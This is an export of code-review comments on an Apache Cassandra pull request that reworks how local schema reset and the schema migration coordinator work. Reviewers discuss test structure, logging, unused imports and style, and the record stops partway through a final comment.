             cluster.schemaChange(""CREATE TABLE "" + KEYSPACE + "".tbl (pk INT PRIMARY KEY, v TEXT)"");
 
             assertTrue(cluster.get(1).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
             assertTrue(cluster.get(2).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
 
+            // now we have a table tbl in the schema of both nodes
+
             cluster.get(2).shutdown().get();
 
-            // when schema is removed and there is no other node to fetch it from, node 1 should be left with clean schema
-            cluster.get(1).runOnInstance(() -> Schema.instance.resetLocalSchema());
+            // when there is no node to fetch the schema from, reset local schema should immediately fail

Review Comment:
   AFAIU it worked in the way that if we don't get a schema from some other node, we will be left in an inconsistent state, where we have `Keyspace` instances for keyspaces which are missing in the local schema. We would have to restart the node in such case. Also if some keyspaces were modified on the other node in the meantime, say a table was dropped - that table will not be dropped on the node were we called reset because from that node's view point, nothing has been dropped, and the stale data files will be left.



;26/Aug/22 16:27;githubbot;600","jacek-lewandowski commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r956212216


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -180,6 +199,18 @@ boolean wasReceived()
         {
             return receivedSchema;
         }
+
+        @Override
+        public String toString()

Review Comment:
   in log messages



;26/Aug/22 16:28;githubbot;600","ekaterinadimitrova2 commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r957692741


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -180,6 +199,18 @@ boolean wasReceived()
         {
             return receivedSchema;
         }
+
+        @Override
+        public String toString()

Review Comment:
   Yes, but I didn't see it used, probably I missed it :-) 



;29/Aug/22 18:55;githubbot;600","ekaterinadimitrova2 commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r957753652


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -220,18 +251,23 @@ boolean wasReceived()
 
     void start()
     {
+        logger.info(""Starting migration coordinator and scheduling pulling schema versions every 1 minute"");

Review Comment:
   I think we need to make it print the SCHEMA_PULL_INTERVAL as it is mutable, not 1 minute necessarily anymore



##########
test/distributed/org/apache/cassandra/distributed/test/SchemaTest.java:
##########
@@ -95,25 +107,54 @@ private void selectSilent(Cluster cluster, String name)
     @Test
     public void schemaReset() throws Throwable
     {
+        CassandraRelevantProperties.MIGRATION_DELAY.setLong(10000);
+        CassandraRelevantProperties.SCHEMA_PULL_INTERVAL.setLong(10000);
         try (Cluster cluster = init(Cluster.build(2).withConfig(cfg -> cfg.with(Feature.GOSSIP, Feature.NETWORK)).start()))
         {
             cluster.schemaChange(""CREATE TABLE "" + KEYSPACE + "".tbl (pk INT PRIMARY KEY, v TEXT)"");
 
             assertTrue(cluster.get(1).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
             assertTrue(cluster.get(2).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
 
+            // now we have a table tbl in the schema of both nodes
+
             cluster.get(2).shutdown().get();
 
-            // when schema is removed and there is no other node to fetch it from, node 1 should be left with clean schema
-            cluster.get(1).runOnInstance(() -> Schema.instance.resetLocalSchema());
+            Awaitility.await().atMost(Duration.ofSeconds(30)) // wait until node 1 notices that node 2 is dead
+                      .until(() -> cluster.get(1).callOnInstance(() -> Gossiper.instance.getLiveMembers().stream().allMatch(e -> e.equals(FBUtilities.getBroadcastAddressAndPort()))));
+
+            // when there is no node to fetch the schema from, reset local schema should immediately fail
+            Assertions.assertThatExceptionOfType(RuntimeException.class).isThrownBy(() -> {
+                cluster.get(1).runOnInstance(() -> Schema.instance.resetLocalSchema());
+            }).withMessageContaining(""Cannot reset local schema when there are no other live nodes"");
+
+            // now, let's make a disagreement, the shutdown node 2 has a definition of tbl, while the running node 1 does not
+            cluster.get(1).runOnInstance(() -> {
+                Schema.instance.transform(current -> Schema.instance.distributedKeyspaces().without(KEYSPACE), false);
+             });
+
             assertTrue(cluster.get(1).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") == null));
 
+            // clear will wait until it receives schema from some other node
+            // also if we start the node2 first, schema of node2 will be synced to schema of node1 because node1 has the newest change (dropping the table)
+            // if we run clean on node1 first, it will advertise empty schema to node2 and apply the schema from it without merging
+            CompletableFuture<Boolean> clear1 = CompletableFuture.supplyAsync(() -> cluster.get(1).callOnInstance(() -> Schema.instance.updateHandler.clear().awaitUninterruptibly(1, TimeUnit.MINUTES)));

Review Comment:
   This line can also be split in a few lines so we don't have to scroll right



##########
test/distributed/org/apache/cassandra/distributed/test/SchemaTest.java:
##########
@@ -19,15 +19,27 @@
 package org.apache.cassandra.distributed.test;
 
 import java.time.Duration;
+import java.util.concurrent.CompletableFuture;
+import java.util.concurrent.TimeUnit;
 
 import org.junit.Test;
 
+import org.apache.cassandra.config.CassandraRelevantProperties;
+import org.apache.cassandra.db.ColumnFamilyStore;
 import org.apache.cassandra.distributed.Cluster;
 import org.apache.cassandra.distributed.api.ConsistencyLevel;
 import org.apache.cassandra.distributed.api.Feature;
+import org.apache.cassandra.gms.Gossiper;
 import org.apache.cassandra.schema.Schema;
+import org.apache.cassandra.schema.SchemaConstants;
+import org.apache.cassandra.schema.SchemaKeyspace;
+import org.apache.cassandra.service.StorageService;
+import org.apache.cassandra.utils.FBUtilities;
+import org.assertj.core.api.Assertions;
 import org.awaitility.Awaitility;
 
+import static org.apache.cassandra.schema.SchemaKeyspaceTables.ALL;

Review Comment:
   Unused import



##########
test/distributed/org/apache/cassandra/distributed/test/SchemaTest.java:
##########
@@ -19,15 +19,27 @@
 package org.apache.cassandra.distributed.test;
 
 import java.time.Duration;
+import java.util.concurrent.CompletableFuture;
+import java.util.concurrent.TimeUnit;
 
 import org.junit.Test;
 
+import org.apache.cassandra.config.CassandraRelevantProperties;
+import org.apache.cassandra.db.ColumnFamilyStore;
 import org.apache.cassandra.distributed.Cluster;
 import org.apache.cassandra.distributed.api.ConsistencyLevel;
 import org.apache.cassandra.distributed.api.Feature;
+import org.apache.cassandra.gms.Gossiper;
 import org.apache.cassandra.schema.Schema;
+import org.apache.cassandra.schema.SchemaConstants;
+import org.apache.cassandra.schema.SchemaKeyspace;
+import org.apache.cassandra.service.StorageService;

Review Comment:
   Unused imports



##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -426,49 +529,19 @@ private Future<Void> scheduleSchemaPull(InetAddressAndPort endpoint, VersionInfo
         FutureTask<Void> task = new FutureTask<>(() -> pullSchema(endpoint, new Callback(endpoint, info)));
 
         if (shouldPullImmediately(endpoint, info.version))
+        {
+            logger.debug(""Pulling {} immediatelly from {}"", info, endpoint);

Review Comment:
   immediately



##########
test/distributed/org/apache/cassandra/distributed/test/SchemaTest.java:
##########
@@ -95,25 +107,54 @@ private void selectSilent(Cluster cluster, String name)
     @Test
     public void schemaReset() throws Throwable
     {
+        CassandraRelevantProperties.MIGRATION_DELAY.setLong(10000);
+        CassandraRelevantProperties.SCHEMA_PULL_INTERVAL.setLong(10000);
         try (Cluster cluster = init(Cluster.build(2).withConfig(cfg -> cfg.with(Feature.GOSSIP, Feature.NETWORK)).start()))
         {
             cluster.schemaChange(""CREATE TABLE "" + KEYSPACE + "".tbl (pk INT PRIMARY KEY, v TEXT)"");
 
             assertTrue(cluster.get(1).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
             assertTrue(cluster.get(2).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
 
+            // now we have a table tbl in the schema of both nodes
+
             cluster.get(2).shutdown().get();
 
-            // when schema is removed and there is no other node to fetch it from, node 1 should be left with clean schema
-            cluster.get(1).runOnInstance(() -> Schema.instance.resetLocalSchema());
+            Awaitility.await().atMost(Duration.ofSeconds(30)) // wait until node 1 notices that node 2 is dead
+                      .until(() -> cluster.get(1).callOnInstance(() -> Gossiper.instance.getLiveMembers().stream().allMatch(e -> e.equals(FBUtilities.getBroadcastAddressAndPort()))));

Review Comment:
   I think this can be split in a few lines as it becomes too long



##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -403,16 +461,61 @@ private synchronized void removeEndpointFromVersion(InetAddressAndPort endpoint,
             return;
 
         info.endpoints.remove(endpoint);
+        logger.trace(""Removed endpoint {} from schema {}: {}"", endpoint, version, info);
         if (info.endpoints.isEmpty())
         {
             info.waitQueue.signalAll();
             versionInfo.remove(version);
+            logger.trace(""Removed schema info: {}"", info);
         }
     }
 
+    /**
+     * Resets the migration coordinator by notifying all waiting threads and removing all the existing version info.
+     * Then, it is populated with the information about schema versions on different endpoints provided by Gossiper.
+     * Each version is marked as unreceived so the migration coordinator will start pulling schemas from other nodes.
+     */
+    synchronized void reset()
+    {
+        logger.info(""Resetting migration coordinator..."");
+
+        this.endpointVersions.clear();
+
+        Iterator<Map.Entry<UUID, VersionInfo>> it = versionInfo.entrySet().iterator();
+        while (it.hasNext())
+        {
+            Map.Entry<UUID, VersionInfo> entry = it.next();
+            it.remove();
+            entry.getValue().waitQueue.signal();
+        }

Review Comment:
   This feels like it deserves its own method?



##########
test/distributed/org/apache/cassandra/distributed/test/SchemaTest.java:
##########
@@ -95,25 +107,54 @@ private void selectSilent(Cluster cluster, String name)
     @Test
     public void schemaReset() throws Throwable
     {
+        CassandraRelevantProperties.MIGRATION_DELAY.setLong(10000);
+        CassandraRelevantProperties.SCHEMA_PULL_INTERVAL.setLong(10000);
         try (Cluster cluster = init(Cluster.build(2).withConfig(cfg -> cfg.with(Feature.GOSSIP, Feature.NETWORK)).start()))
         {
             cluster.schemaChange(""CREATE TABLE "" + KEYSPACE + "".tbl (pk INT PRIMARY KEY, v TEXT)"");
 
             assertTrue(cluster.get(1).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
             assertTrue(cluster.get(2).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
 
+            // now we have a table tbl in the schema of both nodes
+
             cluster.get(2).shutdown().get();
 
-            // when schema is removed and there is no other node to fetch it from, node 1 should be left with clean schema
-            cluster.get(1).runOnInstance(() -> Schema.instance.resetLocalSchema());
+            Awaitility.await().atMost(Duration.ofSeconds(30)) // wait until node 1 notices that node 2 is dead
+                      .until(() -> cluster.get(1).callOnInstance(() -> Gossiper.instance.getLiveMembers().stream().allMatch(e -> e.equals(FBUtilities.getBroadcastAddressAndPort()))));
+
+            // when there is no node to fetch the schema from, reset local schema should immediately fail
+            Assertions.assertThatExceptionOfType(RuntimeException.class).isThrownBy(() -> {
+                cluster.get(1).runOnInstance(() -> Schema.instance.resetLocalSchema());
+            }).withMessageContaining(""Cannot reset local schema when there are no other live nodes"");
+
+            // now, let's make a disagreement, the shutdown node 2 has a definition of tbl, while the running node 1 does not
+            cluster.get(1).runOnInstance(() -> {
+                Schema.instance.transform(current -> Schema.instance.distributedKeyspaces().without(KEYSPACE), false);
+             });
+
             assertTrue(cluster.get(1).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") == null));
 
+            // clear will wait until it receives schema from some other node
+            // also if we start the node2 first, schema of node2 will be synced to schema of node1 because node1 has the newest change (dropping the table)
+            // if we run clean on node1 first, it will advertise empty schema to node2 and apply the schema from it without merging
+            CompletableFuture<Boolean> clear1 = CompletableFuture.supplyAsync(() -> cluster.get(1).callOnInstance(() -> Schema.instance.updateHandler.clear().awaitUninterruptibly(1, TimeUnit.MINUTES)));
+            assertFalse(clear1.isDone());
+
             // when the other node is started, schema should be back in sync
             cluster.get(2).startup();
+            assertTrue(clear1.get());
+
+            // this proves node1 reset schema works - the most recent change should be discarded because it receives
+            // the schema from node2 and applies it on a clean schema
             Awaitility.waitAtMost(Duration.ofMinutes(1))
                       .pollDelay(Duration.ofSeconds(1))
                       .until(() -> cluster.get(1).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
 
+            // now let's break schema locally and let it be reset
+            cluster.get(1).runOnInstance(() -> Schema.instance.getLocalKeyspaces()
+                                                              .get(SchemaConstants.SCHEMA_KEYSPACE_NAME)
+                                                              .get().tables.forEach(t -> ColumnFamilyStore.getIfExists(t.keyspace, t.name).truncateBlockingWithoutSnapshot()));

Review Comment:
   This line also seems too long



##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -403,16 +461,61 @@ private synchronized void removeEndpointFromVersion(InetAddressAndPort endpoint,
             return;
 
         info.endpoints.remove(endpoint);
+        logger.trace(""Removed endpoint {} from schema {}: {}"", endpoint, version, info);
         if (info.endpoints.isEmpty())
         {
             info.waitQueue.signalAll();
             versionInfo.remove(version);
+            logger.trace(""Removed schema info: {}"", info);
         }
     }
 
+    /**
+     * Resets the migration coordinator by notifying all waiting threads and removing all the existing version info.
+     * Then, it is populated with the information about schema versions on different endpoints provided by Gossiper.
+     * Each version is marked as unreceived so the migration coordinator will start pulling schemas from other nodes.
+     */
+    synchronized void reset()
+    {
+        logger.info(""Resetting migration coordinator..."");
+
+        this.endpointVersions.clear();
+
+        Iterator<Map.Entry<UUID, VersionInfo>> it = versionInfo.entrySet().iterator();
+        while (it.hasNext())
+        {
+            Map.Entry<UUID, VersionInfo> entry = it.next();
+            it.remove();
+            entry.getValue().waitQueue.signal();
+        }
+
+        // now report again the versions we are aware of
+        gossiper.getLiveMembers().forEach(endpoint -> {
+            if (FBUtilities.getBroadcastAddressAndPort().equals(endpoint))
+            {
+                reportEndpointVersion(endpoint, schemaVersion.get());
+            }
+            else
+            {
+                EndpointState state = gossiper.getEndpointStateForEndpoint(endpoint);
+                if (state != null)
+                {
+                    UUID v = state.getSchemaVersion();
+                    if (v != null)
+                    {
+                        reportEndpointVersion(endpoint, v);
+                    }
+                }
+            }
+        });

Review Comment:
   This one too
   Not that I am super opinionated but it just feels like it can improve readability that way



;30/Aug/22 01:41;githubbot;600","ekaterinadimitrova2 commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r957753652


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -220,18 +251,23 @@ boolean wasReceived()
 
     void start()
     {
+        logger.info(""Starting migration coordinator and scheduling pulling schema versions every 1 minute"");

Review Comment:
   I think we need to make it print the SCHEMA_PULL_INTERVAL as it is mutable, not always 1 minute necessarily anymore



;30/Aug/22 01:41;githubbot;600","adelapena commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r958439764


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -180,6 +199,18 @@ boolean wasReceived()
         {
             return receivedSchema;
         }
+
+        @Override
+        public String toString()
+        {
+            return ""VersionInfo{"" +
+                   ""version="" + version +
+                   "", outstandingRequests="" + outstandingRequests +
+                   "", requestQueue="" + requestQueue +
+                   "", waitQueue="" + waitQueue.getWaiting() +

Review Comment:
   Maybe it should be `waitQueueSize`?
   ```suggestion
                      "", waitQueueSize="" + waitQueue.getWaiting() +
   ```



##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -23,24 +23,24 @@
 import java.util.ArrayDeque;
 import java.util.ArrayList;
 import java.util.Collection;
-import java.util.Collections;
 import java.util.Deque;
 import java.util.HashMap;
 import java.util.HashSet;
+import java.util.Iterator;
 import java.util.List;
 import java.util.Map;
 import java.util.Objects;
-import java.util.Optional;
 import java.util.Set;
 import java.util.UUID;
+import java.util.concurrent.RejectedExecutionException;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.ScheduledFuture;
-import java.util.concurrent.RejectedExecutionException;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicReference;
 import java.util.function.BiConsumer;
 import java.util.function.LongSupplier;
 import java.util.function.Supplier;
+import java.util.stream.Collectors;

Review Comment:
   Nit: unused import



##########
src/java/org/apache/cassandra/config/CassandraRelevantProperties.java:
##########
@@ -235,6 +235,7 @@
     MEMTABLE_OVERHEAD_SIZE(""cassandra.memtable.row_overhead_size"", ""-1""),
     MEMTABLE_OVERHEAD_COMPUTE_STEPS(""cassandra.memtable_row_overhead_computation_step"", ""100000""),
     MIGRATION_DELAY(""cassandra.migration_delay_ms"", ""60000""),
+    SCHEMA_PULL_INTERVAL(""cassandra.schema_pull_interval_ms"", ""60000""),

Review Comment:
   I'd add a brief JavaDoc line saying what the property does.



##########
src/java/org/apache/cassandra/config/CassandraRelevantProperties.java:
##########
@@ -235,6 +235,7 @@
     MEMTABLE_OVERHEAD_SIZE(""cassandra.memtable.row_overhead_size"", ""-1""),
     MEMTABLE_OVERHEAD_COMPUTE_STEPS(""cassandra.memtable_row_overhead_computation_step"", ""100000""),
     MIGRATION_DELAY(""cassandra.migration_delay_ms"", ""60000""),
+    SCHEMA_PULL_INTERVAL(""cassandra.schema_pull_interval_ms"", ""60000""),

Review Comment:
   Probably we should include the unit in the name, like in `SCHEMA_PULL_INTERVAL_MS`.



##########
test/distributed/org/apache/cassandra/distributed/test/SchemaTest.java:
##########
@@ -95,25 +107,54 @@ private void selectSilent(Cluster cluster, String name)
     @Test
     public void schemaReset() throws Throwable
     {
+        CassandraRelevantProperties.MIGRATION_DELAY.setLong(10000);
+        CassandraRelevantProperties.SCHEMA_PULL_INTERVAL.setLong(10000);
         try (Cluster cluster = init(Cluster.build(2).withConfig(cfg -> cfg.with(Feature.GOSSIP, Feature.NETWORK)).start()))
         {
             cluster.schemaChange(""CREATE TABLE "" + KEYSPACE + "".tbl (pk INT PRIMARY KEY, v TEXT)"");
 
             assertTrue(cluster.get(1).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
             assertTrue(cluster.get(2).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
 
+            // now we have a table tbl in the schema of both nodes
+
             cluster.get(2).shutdown().get();
 
-            // when schema is removed and there is no other node to fetch it from, node 1 should be left with clean schema
-            cluster.get(1).runOnInstance(() -> Schema.instance.resetLocalSchema());
+            Awaitility.await().atMost(Duration.ofSeconds(30)) // wait until node 1 notices that node 2 is dead
+                      .until(() -> cluster.get(1).callOnInstance(() -> Gossiper.instance.getLiveMembers().stream().allMatch(e -> e.equals(FBUtilities.getBroadcastAddressAndPort()))));
+
+            // when there is no node to fetch the schema from, reset local schema should immediately fail
+            Assertions.assertThatExceptionOfType(RuntimeException.class).isThrownBy(() -> {
+                cluster.get(1).runOnInstance(() -> Schema.instance.resetLocalSchema());

Review Comment:
   ```suggestion
                   cluster.get(1).runOnInstance(Schema.instance::resetLocalSchema);
   ```



##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -85,6 +85,10 @@
  * schema. It performs periodic checks and if there is a schema version mismatch between the current node and the other
  * node, it pulls the schema and applies the changes locally through the callback.
  *
+ * In particular the Migration Coordinator keeps track of all schema versions reported from each node in the cluster.
+ * As long as the certain version is advertised by some node, it is being tracked. As long as a version is tracked,

Review Comment:
   ```suggestion
    * As long as a certain version is advertised by some node, it is being tracked. As long as a version is tracked,
   ```



##########
src/java/org/apache/cassandra/schema/DefaultSchemaUpdateHandler.java:
##########
@@ -85,8 +90,21 @@ public DefaultSchemaUpdateHandler(MigrationCoordinator migrationCoordinator,
         this.updateCallback = updateCallback;
         this.migrationCoordinator = migrationCoordinator == null ? createMigrationCoordinator(messagingService) : migrationCoordinator;
         Gossiper.instance.register(this);
-        SchemaPushVerbHandler.instance.register(msg -> applyMutations(msg.payload));
-        SchemaPullVerbHandler.instance.register(msg -> messagingService.send(msg.responseWith(getSchemaMutations()), msg.from()));
+        SchemaPushVerbHandler.instance.register(msg -> {
+            synchronized (this)
+            {
+                if (requestedReset == null)
+                    applyMutations(msg.payload);
+            }
+        });
+        SchemaPullVerbHandler.instance.register(msg -> {
+            try
+            {
+                messagingService.send(msg.responseWith(getSchemaMutations()), msg.from());
+            } catch (RuntimeException ex) {

Review Comment:
   ```suggestion
               }
               catch (RuntimeException ex)
               {
   ```



##########
src/java/org/apache/cassandra/schema/SchemaUpdateHandler.java:
##########
@@ -63,14 +64,15 @@
      * refreshed, the callbacks provided in the factory method are executed, and the updated schema version is announced.
      *
      * @param local whether we should reset with locally stored schema or fetch the schema from other nodes
-     * @return transformation result
      */
-    SchemaTransformationResult reset(boolean local);
+    void reset(boolean local);
 
     /**
      * Clears the locally stored schema entirely. After this operation the schema is equal to {@link DistributedSchema#EMPTY}.
      * The method does not execute any callback. It is indended to reinitialize the schema later using the method
      * {@link #reset(boolean)}.
+     *
+     * @return

Review Comment:
   I think we should either add some description to the `@return` tag or remove it.



##########
src/java/org/apache/cassandra/schema/Schema.java:
##########
@@ -611,18 +615,27 @@ public SchemaTransformationResult transform(SchemaTransformation transformation,
      * Clear all locally stored schema information and fetch schema from another node.
      * Called by user (via JMX) who wants to get rid of schema disagreement.
      */
-    public synchronized void resetLocalSchema()
+    public void resetLocalSchema()
     {
         logger.debug(""Clearing local schema..."");
-        updateHandler.clear();
 
-        logger.debug(""Clearing local schema keyspace instances..."");
-        distributedKeyspaces.forEach(this::unload);
-        updateVersion(SchemaConstants.emptyVersion);
-        SchemaDiagnostics.schemaCleared(this);
+        if (Gossiper.instance.getLiveMembers().stream().allMatch(ep -> FBUtilities.getBroadcastAddressAndPort().equals(ep)))
+            throw new InvalidRequestException(""Cannot reset local schema when there are no other live nodes"");
 
-        updateHandler.reset(false);
-        logger.info(""Local schema reset is complete."");
+        Awaitable clearCompletion = updateHandler.clear();
+        try
+        {
+            if (!clearCompletion.await(StorageService.SCHEMA_DELAY_MILLIS, TimeUnit.MILLISECONDS)) {

Review Comment:
   ```suggestion
               if (!clearCompletion.await(StorageService.SCHEMA_DELAY_MILLIS, TimeUnit.MILLISECONDS))
               {
   ```



;30/Aug/22 12:55;githubbot;600","adelapena commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r958506680


##########
test/distributed/org/apache/cassandra/distributed/test/SchemaTest.java:
##########
@@ -95,25 +107,54 @@ private void selectSilent(Cluster cluster, String name)
     @Test
     public void schemaReset() throws Throwable
     {
+        CassandraRelevantProperties.MIGRATION_DELAY.setLong(10000);
+        CassandraRelevantProperties.SCHEMA_PULL_INTERVAL.setLong(10000);
         try (Cluster cluster = init(Cluster.build(2).withConfig(cfg -> cfg.with(Feature.GOSSIP, Feature.NETWORK)).start()))
         {
             cluster.schemaChange(""CREATE TABLE "" + KEYSPACE + "".tbl (pk INT PRIMARY KEY, v TEXT)"");
 
             assertTrue(cluster.get(1).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
             assertTrue(cluster.get(2).callOnInstance(() -> Schema.instance.getTableMetadata(KEYSPACE, ""tbl"") != null));
 
+            // now we have a table tbl in the schema of both nodes
+
             cluster.get(2).shutdown().get();
 
-            // when schema is removed and there is no other node to fetch it from, node 1 should be left with clean schema
-            cluster.get(1).runOnInstance(() -> Schema.instance.resetLocalSchema());
+            Awaitility.await().atMost(Duration.ofSeconds(30)) // wait until node 1 notices that node 2 is dead
+                      .until(() -> cluster.get(1).callOnInstance(() -> Gossiper.instance.getLiveMembers().stream().allMatch(e -> e.equals(FBUtilities.getBroadcastAddressAndPort()))));
+
+            // when there is no node to fetch the schema from, reset local schema should immediately fail
+            Assertions.assertThatExceptionOfType(RuntimeException.class).isThrownBy(() -> {
+                cluster.get(1).runOnInstance(() -> Schema.instance.resetLocalSchema());

Review Comment:
   Please ignore this last suggestion, I forgot that method references don't work in the dtest framework.



;30/Aug/22 13:48;githubbot;600","adelapena commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r958508910


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -369,22 +418,31 @@ private synchronized boolean shouldApplySchemaFor(VersionInfo info)
 
     synchronized Future<Void> reportEndpointVersion(InetAddressAndPort endpoint, UUID version)
     {
+        logger.debug(""Reported schema {} at endpoint {}"", version, endpoint);
         if (ignoredEndpoints.contains(endpoint) || IGNORED_VERSIONS.contains(version))
         {
             endpointVersions.remove(endpoint);
             removeEndpointFromVersion(endpoint, null);
+            logger.debug(""Discarding endpoint {} or schema {} because either endpoint or schema version were marked as ignored"", endpoint, version);
             return FINISHED_FUTURE;
         }
 
         UUID current = endpointVersions.put(endpoint, version);
         if (current != null && current.equals(version))
+        {
+            logger.trace(""Skipping report of schema {} from {} because we already know that"", version, endpoint);
             return FINISHED_FUTURE;
+        }
 
         VersionInfo info = versionInfo.computeIfAbsent(version, VersionInfo::new);
         if (Objects.equals(schemaVersion.get(), version))
+        {
             info.markReceived();
+            logger.trace(""Schema {} from {} has been marked as recevied because it is equal the local schema"", version, endpoint);
+        }
         info.endpoints.add(endpoint);
-        info.requestQueue.addFirst(endpoint);
+        info.requestQueue.addFirst(endpoint); // TODO not sure if it is correct - given we've just marked this schema version as received, why do we add a request to receive it?

Review Comment:
   Still trying to understand why it's needed, but for sure a quick attempt at removing it breaks the tests.



;30/Aug/22 13:49;githubbot;600","ekaterinadimitrova2 commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r958548263


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -369,22 +418,31 @@ private synchronized boolean shouldApplySchemaFor(VersionInfo info)
 
     synchronized Future<Void> reportEndpointVersion(InetAddressAndPort endpoint, UUID version)
     {
+        logger.debug(""Reported schema {} at endpoint {}"", version, endpoint);
         if (ignoredEndpoints.contains(endpoint) || IGNORED_VERSIONS.contains(version))
         {
             endpointVersions.remove(endpoint);
             removeEndpointFromVersion(endpoint, null);
+            logger.debug(""Discarding endpoint {} or schema {} because either endpoint or schema version were marked as ignored"", endpoint, version);
             return FINISHED_FUTURE;
         }
 
         UUID current = endpointVersions.put(endpoint, version);
         if (current != null && current.equals(version))
+        {
+            logger.trace(""Skipping report of schema {} from {} because we already know that"", version, endpoint);
             return FINISHED_FUTURE;
+        }
 
         VersionInfo info = versionInfo.computeIfAbsent(version, VersionInfo::new);
         if (Objects.equals(schemaVersion.get(), version))
+        {
             info.markReceived();
+            logger.trace(""Schema {} from {} has been marked as recevied because it is equal the local schema"", version, endpoint);
+        }
         info.endpoints.add(endpoint);
-        info.requestQueue.addFirst(endpoint);
+        info.requestQueue.addFirst(endpoint); // TODO not sure if it is correct - given we've just marked this schema version as received, why do we add a request to receive it?

Review Comment:
   The same logic is in pullComplete.
   Seems to me we mark before we deal with it in maybePullSchema, I am still not sure why though.... looking again into that



;30/Aug/22 14:21;githubbot;600","ekaterinadimitrova2 commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r958548263


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -369,22 +418,31 @@ private synchronized boolean shouldApplySchemaFor(VersionInfo info)
 
     synchronized Future<Void> reportEndpointVersion(InetAddressAndPort endpoint, UUID version)
     {
+        logger.debug(""Reported schema {} at endpoint {}"", version, endpoint);
         if (ignoredEndpoints.contains(endpoint) || IGNORED_VERSIONS.contains(version))
         {
             endpointVersions.remove(endpoint);
             removeEndpointFromVersion(endpoint, null);
+            logger.debug(""Discarding endpoint {} or schema {} because either endpoint or schema version were marked as ignored"", endpoint, version);
             return FINISHED_FUTURE;
         }
 
         UUID current = endpointVersions.put(endpoint, version);
         if (current != null && current.equals(version))
+        {
+            logger.trace(""Skipping report of schema {} from {} because we already know that"", version, endpoint);
             return FINISHED_FUTURE;
+        }
 
         VersionInfo info = versionInfo.computeIfAbsent(version, VersionInfo::new);
         if (Objects.equals(schemaVersion.get(), version))
+        {
             info.markReceived();
+            logger.trace(""Schema {} from {} has been marked as recevied because it is equal the local schema"", version, endpoint);
+        }
         info.endpoints.add(endpoint);
-        info.requestQueue.addFirst(endpoint);
+        info.requestQueue.addFirst(endpoint); // TODO not sure if it is correct - given we've just marked this schema version as received, why do we add a request to receive it?

Review Comment:
   The same logic is in pullComplete.
   Seems to me we `markReceived` before we deal with it in `maybePullSchema`, I am still not sure why though.... looking again into that



;30/Aug/22 14:21;githubbot;600","adelapena commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r958550725


##########
src/java/org/apache/cassandra/schema/MigrationCoordinator.java:
##########
@@ -369,22 +418,31 @@ private synchronized boolean shouldApplySchemaFor(VersionInfo info)
 
     synchronized Future<Void> reportEndpointVersion(InetAddressAndPort endpoint, UUID version)
     {
+        logger.debug(""Reported schema {} at endpoint {}"", version, endpoint);
         if (ignoredEndpoints.contains(endpoint) || IGNORED_VERSIONS.contains(version))
         {
             endpointVersions.remove(endpoint);
             removeEndpointFromVersion(endpoint, null);
+            logger.debug(""Discarding endpoint {} or schema {} because either endpoint or schema version were marked as ignored"", endpoint, version);
             return FINISHED_FUTURE;
         }
 
         UUID current = endpointVersions.put(endpoint, version);
         if (current != null && current.equals(version))
+        {
+            logger.trace(""Skipping report of schema {} from {} because we already know that"", version, endpoint);
             return FINISHED_FUTURE;
+        }
 
         VersionInfo info = versionInfo.computeIfAbsent(version, VersionInfo::new);
         if (Objects.equals(schemaVersion.get(), version))
+        {
             info.markReceived();
+            logger.trace(""Schema {} from {} has been marked as recevied because it is equal the local schema"", version, endpoint);
+        }
         info.endpoints.add(endpoint);
-        info.requestQueue.addFirst(endpoint);
+        info.requestQueue.addFirst(endpoint); // TODO not sure if it is correct - given we've just marked this schema version as received, why do we add a request to receive it?

Review Comment:
   Actually, it hasn't necessarily marked are received, has it? It's only marked as received if it's equals to the local schema, I think.



;30/Aug/22 14:23;githubbot;600","ekaterinadimitrova2 commented on code in PR #1804:
URL: https://github.com/apache/cassandra/pull/1804#discussion_r958548263


